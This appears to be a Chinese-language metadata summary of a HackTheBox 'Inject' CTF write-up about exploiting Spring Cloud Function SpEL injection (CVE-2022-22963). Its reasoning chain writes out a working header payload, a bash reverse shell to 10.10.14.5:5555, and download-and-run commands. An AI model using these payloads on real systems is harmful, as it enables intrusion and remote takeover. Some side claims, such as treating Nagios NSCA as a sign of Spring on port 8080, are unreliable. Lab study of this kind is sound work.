...
quality: high
full_path: HackTheBox_Inject_WriteUp.full.md
meta_path: HackTheBox_Inject_WriteUp.meta.md
images_removed: true
images_removed_count: 0
schema_version: v3.0.0-P0
summary: 'HackTheBox Inject WriteUp。HTB Inject：Spring Cloud Function RCE 反弹shell。关键路径：nmap: 22/8080端口, Nagios NSCA → Spring Cloud Function RCE (Spring4Shell 变种) → curl POST /functionRouter。经验：Spring Cloud Fu...'
category: web
subcategory: rce
tools_used:
- Python
...
wp_url: https://www.ctfiot.com/124081.html
reasoning_chain:
- 触发点：nmap 扫到 22/8080 + Nagios NSCA → 假设：8080 是 Spring 应用 → 动作：访问 GET / 看 banner
- 下一步：尝试 Spring Cloud Function 已知 RCE (CVE-2022-22963 Spring4Shell 变种) → 动作：curl -X POST /functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("touch /tmp/pwned")' --data-raw 'data'
- '观察：HTTP 500 响应 ''EL1001E: Type conversion problem, cannot convert from java.lang.ProcessImpl to java.lang.String'' → 假设：exec 成功但 exec 返回 Process 对象无法 toString'
- 下一步：构造反弹 shell → 动作：写 rce.sh 包含 'bash -i >& /dev/tcp/10.10.14.5/5555 0>&1' → python3 -m http.server 80
- 动作：curl POST /functionRouter -H 'routing-expression:...exec("curl 10.10.14.5/rce.sh -o /tmp/rce")' → 观察：服务端下载 rce.sh
- 下一步：curl POST /functionRouter -H 'routing-expression:...exec("bash /tmp/rce")' → nc -lvnp 5555 监听 → 观察：frank@inject shell 拿到 user.txt
failed_attempts:
- 试图直接 exec("id") → 失败：返回 EL1001E，需外带
- 试图用 base64 编码反弹 shell → 失败：SpEL 不直接支持 exec 二次解码
key_observations:
- Spring Cloud Function routing-expression 是 Spring4Shell 变种 (CVE-2022-22963)，T(java.lang.Runtime).getRuntime().exec() 是 SpEL payload 模板
- SpEL EL1001E 错误信息暴露 exec 执行成功但返回 Process 对象，必须外带（bash -i / curl）
- 三步反弹：写 rce.sh + python -m http.server + curl 下载 + bash 执行，避开 inline exec 长度限制
- nmap 看到 Nagios NSCA 是 Spring 常见端口（8080）标志
prerequisites:
- Spring Cloud Function SpEL 注入 (CVE-2022-22963)
- bash 反弹 shell + base64 编码
- python3 -m http.server 临时 HTTP 服务
- curl -H 自定义 header 注入 SpEL
---
